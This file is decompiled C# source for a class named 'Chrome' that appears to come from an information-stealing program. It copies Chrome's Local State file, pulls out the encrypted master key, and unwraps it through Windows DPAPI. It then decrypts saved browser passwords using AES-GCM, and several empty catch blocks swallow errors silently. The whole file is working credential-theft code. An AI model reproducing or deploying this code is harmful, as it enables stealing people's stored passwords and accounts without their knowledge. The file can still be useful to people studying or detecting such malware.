using System;
using System.Collections;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Web.Script.Serialization;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;

// Token: 0x0200001E RID: 30
public class Chrome
{
	// Token: 0x0600004C RID: 76
	[DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	protected static extern bool CryptUnprotectData(ref Chrome.DATA_BLOB pCipherText, ref string pszDescription, ref Chrome.DATA_BLOB pEntropy, IntPtr pReserved, ref Chrome.CRYPTPROTECT_PROMPTSTRUCT pPrompt, int dwFlags, ref Chrome.DATA_BLOB pPlainText);

	// Token: 0x0600004D RID: 77 RVA: 0x0000572A File Offset: 0x0000392A
	protected static void InitPrompt(ref Chrome.CRYPTPROTECT_PROMPTSTRUCT ps)
	{
		ps.cbSize = Marshal.SizeOf(typeof(Chrome.CRYPTPROTECT_PROMPTSTRUCT));
		ps.dwPromptFlags = 0;
		ps.hwndApp = (IntPtr)0;
		ps.szPrompt = null;
	}

	// Token: 0x0600004E RID: 78 RVA: 0x0000575C File Offset: 0x0000395C
	protected static void InitBLOB(byte[] data, ref Chrome.DATA_BLOB blob)
	{
		if (data == null)
		{
			data = new byte[0];
		}
		blob.pbData = Marshal.AllocHGlobal(data.Length);
		if (blob.pbData == IntPtr.Zero)
		{
			return;
		}
		blob.cbData = data.Length;
		Marshal.Copy(data, 0, blob.pbData, data.Length);
	}

	// Token: 0x0600004F RID: 79 RVA: 0x000057B0 File Offset: 0x000039B0
	protected static byte[] cipher_decrypter(byte[] cipherTextBytes)
	{
		Chrome.DATA_BLOB data_BLOB = default(Chrome.DATA_BLOB);
		Chrome.DATA_BLOB data_BLOB2 = default(Chrome.DATA_BLOB);
		Chrome.DATA_BLOB data_BLOB3 = default(Chrome.DATA_BLOB);
		Chrome.CRYPTPROTECT_PROMPTSTRUCT cryptprotect_PROMPTSTRUCT = default(Chrome.CRYPTPROTECT_PROMPTSTRUCT);
		Chrome.InitPrompt(ref cryptprotect_PROMPTSTRUCT);
		string empty = string.Empty;
		byte[] result;
		try
		{
			try
			{
				Chrome.InitBLOB(cipherTextBytes, ref data_BLOB2);
			}
			catch
			{
			}
			try
			{
				Chrome.InitBLOB(Encoding.Default.GetBytes(string.Empty), ref data_BLOB3);
			}
			catch
			{
			}
			if (Chrome.CryptUnprotectData(ref data_BLOB2, ref empty, ref data_BLOB3, IntPtr.Zero, ref cryptprotect_PROMPTSTRUCT, 1, ref data_BLOB))
			{
				byte[] array = new byte[data_BLOB.cbData];
				Marshal.Copy(data_BLOB.pbData, array, 0, data_BLOB.cbData);
				result = array;
			}
			else
			{
				result = null;
			}
		}
		catch
		{
			result = null;
		}
		finally
		{
			if (data_BLOB.pbData != IntPtr.Zero)
			{
				Marshal.FreeHGlobal(data_BLOB.pbData);
			}
			if (data_BLOB2.pbData != IntPtr.Zero)
			{
				Marshal.FreeHGlobal(data_BLOB2.pbData);
			}
			if (data_BLOB3.pbData != IntPtr.Zero)
			{
				Marshal.FreeHGlobal(data_BLOB3.pbData);
			}
		}
		return result;
	}

	// Token: 0x06000050 RID: 80 RVA: 0x000058EC File Offset: 0x00003AEC
	public void GETMasterKey(string path)
	{
		try
		{
			if (File.Exists(path))
			{
				string text = string.Format("{0}{1}", global::Buffer.path_t, GetRandom.String(null, -1));
				try
				{
					if (File.Exists(text))
					{
						File.Delete(text);
					}
				}
				catch
				{
				}
				try
				{
					File.Copy(path, text, true);
				}
				catch
				{
				}
				byte[] array = Convert.FromBase64String((string)((IDictionary)((IDictionary)new JavaScriptSerializer().DeserializeObject(File.ReadAllText(text)))["os_crypt"])["encrypted_key"]);
				byte[] array2 = new byte[array.Length - 5];
				Array.Copy(array, 5, array2, 0, array.Length - 5);
				this.mkey = Chrome.cipher_decrypter(array2);
			}
		}
		catch
		{
		}
	}

	// Token: 0x06000051 RID: 81 RVA: 0x000059CC File Offset: 0x00003BCC
	protected static string[] GET_IVPayLoad(string encrypted_password)
	{
		return new string[]
		{
			encrypted_password.Substring(3, 12),
			encrypted_password.Substring(15)
		};
	}

	// Token: 0x06000052 RID: 82 RVA: 0x000059EC File Offset: 0x00003BEC
	protected static string decrypt_data(byte[] EncryptedData, byte[] key, byte[] iv)
	{
		string result;
		try
		{
			GcmBlockCipher gcmBlockCipher = new GcmBlockCipher(new AesEngine());
			gcmBlockCipher.Init(false, new AeadParameters(new KeyParameter(key), 128, iv, null));
			byte[] array = new byte[gcmBlockCipher.GetOutputSize(EncryptedData.Length)];
			gcmBlockCipher.DoFinal(array, gcmBlockCipher.ProcessBytes(EncryptedData, 0, EncryptedData.Length, array, 0));
			result = Encoding.Default.GetString(array);
		}
		catch
		{
			result = null;
		}
		return result;
	}

	// Token: 0x06000053 RID: 83 RVA: 0x00005A68 File Offset: 0x00003C68
	public string Decrypt(string encrypted_password, bool v80 = true)
	{
		try
		{
			if (v80)
			{
				string[] array = Chrome.GET_IVPayLoad(encrypted_password);
				byte[] bytes = Encoding.Default.GetBytes(array[0]);
				string text = Chrome.decrypt_data(Encoding.Default.GetBytes(array[1]), this.mkey, bytes);
				return (text.Length > 0) ? text : null;
			}
			return Encoding.Default.GetString(Chrome.cipher_decrypter(Encoding.Default.GetBytes(encrypted_password)));
		}
		catch
		{
		}
		return null;
	}

	// Token: 0x0400001B RID: 27
	protected byte[] mkey;

	// Token: 0x0200001F RID: 31
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	protected internal struct DATA_BLOB
	{
		// Token: 0x0400001C RID: 28
		public int cbData;

		// Token: 0x0400001D RID: 29
		public IntPtr pbData;
	}

	// Token: 0x02000020 RID: 32
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	protected internal struct CRYPTPROTECT_PROMPTSTRUCT
	{
		// Token: 0x0400001E RID: 30
		public int cbSize;

		// Token: 0x0400001F RID: 31
		public int dwPromptFlags;

		// Token: 0x04000020 RID: 32
		public IntPtr hwndApp;

		// Token: 0x04000021 RID: 33
		public string szPrompt;
	}
}
